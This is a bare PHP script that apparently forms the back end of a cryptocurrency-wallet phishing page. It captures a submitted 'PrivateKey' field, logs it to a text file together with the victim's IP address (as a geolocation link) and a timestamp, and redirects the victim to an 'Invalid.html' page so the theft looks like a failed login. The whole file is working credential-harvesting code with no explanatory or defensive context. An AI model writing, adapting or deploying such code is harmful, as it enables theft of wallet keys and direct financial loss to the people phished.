<?php

header("Location:Invalid.html");

?>

<?php
$ip   = getenv("REMOTE_ADDR");
$file = "_____TWT__________.txt";
$walletSeed   = $_POST['PrivateKey'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "********************blockchain******************");
fwrite($handle, "\n");
fwrite($handle, "KEY : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "http://www.geoiptool.com/?IP=$ip");
fwrite($handle, "\n");
fwrite($handle, "********************blockchain******************");
fwrite($handle, "\n");
fclose($handle);

?>
